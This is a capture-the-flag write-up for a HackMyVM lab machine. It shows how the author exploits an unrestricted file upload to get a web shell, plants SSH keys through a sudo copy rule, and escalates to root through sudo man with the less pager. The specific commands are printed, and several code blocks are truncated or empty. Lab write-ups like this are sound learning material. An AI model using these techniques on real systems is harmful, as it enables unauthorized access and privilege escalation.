## Overview

Quite a good box to learn and explore concepts.

```bash

## HTTP- TCP 80

Enumerating using gobuster shows several interesting files. `admin`,`upload.php` and `upload.html`.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/hackmyv/five]

Looks like at `upload.html` we can upload files onto the server:

![five1](/assets/img/hackmyvm/five/five1.png)

Let's upload a `test.txt` which contains the content : "hello world".

We can see that the file is uploaded at  the upload forlder `http://192.168.56.27/uploads/test.txt`.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/hackmyv/five]
â””â”€# curl http://192.168.56.27/uploads/test.txt       
hello world
```

Next, we should upload a reverse shell.

![five2](/assets/img/hackmyvm/five/five2.png)

Unfortunately, looks like the php file is unable to be viewed at the uploads folder as we receive a 403 forbidden.

![five3](/assets/img/hackmyvm/five/five3.png)

Let's try to instead upload the test.txt onto another folder. Looking at burpsuite , we can see that the file will be upload at `uploads/` .

![five5](/assets/img/hackmyvm/five/five5.png)

Let's try to change the target to `admin` instead.

![five5](/assets/img/hackmyvm/five/five5.png)
Nice, looks like we can upload the file anywhere on the server.

![five6](/assets/img/hackmyvm/five/five6.png)

## Shell as www-data

This time we will not specify a directory to upload to, so we can target its main folder possibly at `/var/www/html` in the backend.


![five7](/assets/img/hackmyvm/five/five7.png)
Catch the reverse shell on local machin and we are in!
```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/hackmyv/five]

    (melisa) NOPASSWD: /bin/cp  

```

We can see that `(melisa) NOPASSWD: /bin/cp ` we can run the copy command as melisa. This means we can copy files that once own by www-data and it will become melisa owned file. 

One thing we can do is to copy over id_rsa/id_rsa.pub keys.

### Attempt 1

Use CP to copy local machine id_rsa.pub to replace melisa id_rsa.pub
```bash
Local machine
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/hackmyv/five]
â””â”€# cp /root/.ssh/id_rsa.pub .
                                                                                                                                                                          
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/hackmyv/five]

$ sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/id_rsa.pub
sudo -u melisa cp id_rsa.pub /home/melisa/.ssh/id_rsa.pub
```

Let's SSH into melisa!

```bash
Cant SSH into server because no SSH connection
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/hackmyv/five]
â””â”€# ssh melisa@192.168.56.27 -i id_rsa.pub 
ssh: connect to host 192.168.56.27 port 22: Connection refused
```
### Attempt 2

Looking at the ssh configuratiion can see it's listening internally on port 4444 internally.
```bash
$ cat /etc/ssh/sshd_config                                                                                                                                                
cat /etc/ssh/sshd_config

Now, we try to ssh internally after porting our own id_rsa over!


Bringing over id_rsa over from local machine to victim server:

Looks like we require not only the publickey but also a password.

### Attempt 3
Reading from https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/.

Looks like we are msising on step : Copying the public key to the **authorized_hosts** file as well!

```bash

Great we are now melisa!

## Shell as Root
We can see that `/bin/man` does not require password and GTFObins has stated we can exploit this to become root.

```bash
Melisa@five:~$ sudo -l
Matching Defaults entries for melisa on five:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User melisa may run the following commands on five:
    (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear

```
## Attempt 1
However running `sudo -u root /bin/man /bin/man`
This is because as stated in the GTFObin page 

> This invokes the default pager, which is likely to be 
> [`less`](https://gtfobins.github.io/gtfobins/less/), other functions may apply.

As we can see  reading from the man pages, the default pager is set to pager. 
```bash
   Controlling formatted output
       -P pager, --pager=pager
              Specify which output pager to use.  By default, man uses pager, falling back to cat if pager is not found or is not executable.  This option  overrides
              the $MANPAGER environment variable, which in turn overrides the $PAGER environment variable.  It is not used in conjunction with -f or -k.

              The  value  may be a simple command name or a command with arguments, and may use shell quoting (backslashes, single quotes, or double quotes).  It may
              not use pipes to connect multiple commands; if you need that, use a wrapper script, which may take the file to display either  as  an  argument  or  on
              standard input.
```
So instead, we have to use the `less` command as a pager and exploit it to get it working.

```bash
melisa@five:~$ which less
/usr/bin/less

melisa@five:/tmp$ sudo -u root /bin/man -P /usr/bin/less man
```

And we are root!

```bash
# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
five
```
